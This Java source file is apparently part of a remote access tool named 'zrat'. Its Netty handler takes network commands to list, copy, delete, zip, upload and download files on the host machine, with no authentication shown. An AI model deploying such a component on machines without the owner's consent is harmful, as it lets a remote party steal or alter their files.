package com.zrat.server.nio.handler;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;

import org.jboss.netty.bootstrap.ClientBootstrap;
import org.jboss.netty.channel.Channel;
import org.jboss.netty.channel.ChannelFuture;
import org.jboss.netty.channel.ChannelHandler.Sharable;
import org.jboss.netty.channel.ChannelHandlerContext;
import org.jboss.netty.channel.MessageEvent;
import org.jboss.netty.util.Timer;

import com.zrat.server.Server;
import com.zrat.server.controller.FileService;
import com.zrat.server.controller.FileServiceImpl;
import com.zrat.server.nio.listener.FileTransferFutureListener;
import com.zrat.server.nio.listener.ResponseMsg;
import com.zrat.transfer.model.TransferDataStruct;

@Sharable
public class FileHandler extends ServerNIOHandler {

	public FileHandler(ClientBootstrap bootstrap, Timer timer) {
		super(bootstrap, timer);
	}

	@Override
	public void messageReceived(ChannelHandlerContext ctx, MessageEvent e) {
		if (e.getMessage() instanceof TransferDataStruct) {
			FileService service = new FileServiceImpl();
			TransferDataStruct data = (TransferDataStruct) e.getMessage();
			// System.out.println(data.getAction());
			Channel channel = e.getChannel();
			if (FileService.COMMAND_COPYFILE.equals(data.getAction())) {
				String[] strs = (String[]) data.getObject();
				channel.write(service.copyFile(strs[0], strs[1]));
			} else if (FileService.COMMAND_CREATEDIRECTORY.equals(data
					.getAction())) {
				String[] strs = (String[]) data.getObject();
				channel.write(service.createDic(strs[0], strs[1]));
			} else if (FileService.COMMAND_CREATEFILE.equals(data.getAction())) {
				String[] strs = (String[]) data.getObject();
				channel.write(service.createFile(strs[0], strs[1]));
			} else if (FileService.COMMAND_CUTFILE.equals(data.getAction())) {
				String[] strs = (String[]) data.getObject();
				channel.write(service.cutFile(strs[0], strs[1]));
			} else if (FileService.COMMAND_DELETEFILE.equals(data.getAction())) {
				String[] strs = (String[]) data.getObject();
				channel.write(service.deleteFile(strs[0]));
			} else if (FileService.COMMAND_DOWNLOAD.equals(data.getAction())) {
				String[] strs = (String[]) data.getObject();
				TransferDataStruct fileData = new TransferDataStruct(
						FileService.COMMAND_DOWNLOAD);
				ResponseMsg re = new ResponseMsg();
				File f = null;
				for (String str : strs) {
					re.addFile(str);
					f = new File(str);
					re.putFileSize(strs[0], f.length());
				}
				fileData.setObject(strs[0]);

				try {
					ChannelFuture fu = channel.write(fileData);

					fu.addListener(new FileTransferFutureListener(re, 0));

				} catch (IOException e1) {
					e1.printStackTrace();
				}
			} else if (FileService.COMMAND_DOWNLOAD_BYTE.equals(data
					.getAction())) {
				byte[] fileByte = (byte[]) data.getObject();

				RandomAccessFile raf = null;
				try {
					File f = new File(Server.currentFile);
					raf = new RandomAccessFile(f, "rw");
					raf.seek(raf.length());
					raf.write(fileByte);

				} catch (Exception ee) {
					ee.printStackTrace();
				} finally {

					try {
						if (raf != null)
							raf.close();
					} catch (IOException e1) {
						e1.printStackTrace();
					}
				}
			} else if (FileService.COMMAND_UPLOADFILE.equals(data.getAction())) {
				Server.currentFile = data.getObject()+"";
			} else if (FileService.COMMAND_SHOWFILES.equals(data.getAction())) {
				String str = data.getObject().toString();
				channel.write(service.getFiles(str));
			} else if (FileService.COMMAND_SHOWROOTS.equals(data.getAction())) {
				channel.write(service.getRoots());
			} else if (FileService.COMMAND_UNZIPFILE.equals(data.getAction())) {
				String[] strs = (String[]) data.getObject();
				channel.write(service.unZipFile(strs[0], strs[0].substring(0,strs[0].lastIndexOf("."))));
			} else if (FileService.COMMAND_ZIPFILE.equals(data.getAction())) {
				String[] strs = (String[]) data.getObject();
				channel.write(service.zipFile(strs[0], strs[0]+".zip"));
			} else {
				ctx.sendUpstream(e);
			}

		}
	}

}
